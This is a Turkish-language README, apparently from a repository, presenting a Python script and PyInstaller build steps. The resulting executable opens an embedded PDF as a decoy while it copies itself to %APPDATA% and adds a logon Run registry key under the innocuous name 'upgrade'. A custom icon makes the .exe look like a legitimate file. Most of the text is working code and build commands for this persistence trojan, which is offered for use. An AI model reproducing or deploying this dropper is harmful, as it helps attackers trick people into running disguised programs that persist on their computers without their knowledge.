# 🛠️ Persistence Script with PDF Execution and Custom Icon

Bu proje, Windows ortamında **kalıcılık (persistence)** sağlamak ve çalıştırıldığında beraberindeki bir **PDF** dosyasını açmak üzere hazırlanmış bir Python scriptidir. Ayrıca, `.exe` dosyasına özel bir **ikon (.ico)** da atanabilir.

---

## 🔍 Özellikler

- `AppData` altına kendini kopyalayarak gizli kalıcılık sağlar.
- `HKCU\...\Run` anahtarına kayıt ekleyerek kullanıcı oturum açtığında otomatik çalışır.
- PyInstaller ile paketlenmiş `.exe` içerisine gömülü bir `PDF` dosyasını açar.
- Özel `.ico` dosyası sayesinde çalıştırılabilir dosyanız profesyonel bir görünüme sahip olur.

---

## 🧪 Kurulum ve Kullanım

### 1. Python Scripti

```python
import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
    # persistence
    new_file = os.environ["appdata"] + "\\deneme.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file():
    added_file = sys._MEIPASS + "\\deneme.pdf"
    subprocess.Popen(added_file, shell=True)

open_added_file()
```

### 2. Gerekli Dosyaları Hazırla

- `deneme.pdf` → Açılacak PDF dosyası
- `icon.ico` → Program simgesi olarak kullanılacak ikon dosyası

### 3. PyInstaller ile Derleme

```bash
pyinstaller --onefile --add-data "deneme.pdf;." --icon=icon.ico scriptadi.py
```

> `--icon=icon.ico` parametresi, `.exe` dosyasına özel bir ikon ekler. Bu, masaüstünde veya dosya gezgininde daha profesyonel bir görünüm sağlar.

---

## ⚙️ Nasıl Çalışır?

- `add_to_registry()` fonksiyonu:
  - Scriptin kendisini `%APPDATA%\deneme.exe` konumuna kopyalar.
  - Windows'un kayıt defterine (`HKCU\...Run`) bu konumu otomatik çalıştırmak için ekler.

- `open_added_file()` fonksiyonu:
  - PyInstaller ile paketlenmiş `.exe` içerisinden `deneme.pdf` dosyasını çıkarır ve çalıştırır.

---

